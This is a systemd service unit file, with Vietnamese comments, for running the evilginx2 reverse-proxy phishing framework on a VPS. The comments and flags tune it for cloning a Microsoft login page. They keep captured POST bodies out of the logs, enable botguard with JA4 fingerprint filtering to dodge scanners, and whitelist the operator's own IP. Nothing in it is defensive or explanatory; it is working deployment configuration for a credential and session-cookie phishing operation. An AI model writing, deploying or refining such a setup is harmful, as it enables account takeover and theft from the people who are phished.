[Unit]
Description=evilginx2 (fake-evilginx-pro) - <PHISHLETS> @ <BASE>.<ZONE>
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=<RUN_USER>
WorkingDirectory=<INSTALL_DIR>
# stdin phải luôn mở (console đọc stdin; EOF dưới systemd = exit ngay)
# KHÔNG -jsobf ultra (obfuscator hỏng JS trang MS login — SyntaxError)
# KHÔNG -debug (ghi plaintext POST body vào journal)
# -bg-trusted: loopback + hairpin IP của VPS (operator test từ VPS) — bỏ scoring self-test
# Render các placeholder <...> trên node thật — KHÔNG commit giá trị đã render
ExecStart=/bin/sh -c 'tail -f /dev/null | <INSTALL_DIR>/evilginx2 -p <INSTALL_DIR>/phishlets -api 9443 -botguard -bg-ja4 t13d15 -bg-trusted 127.0.0.1/32,<VPS_IP>/32'
Restart=on-failure
RestartSec=5
KillMode=mixed
AmbientCapabilities=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
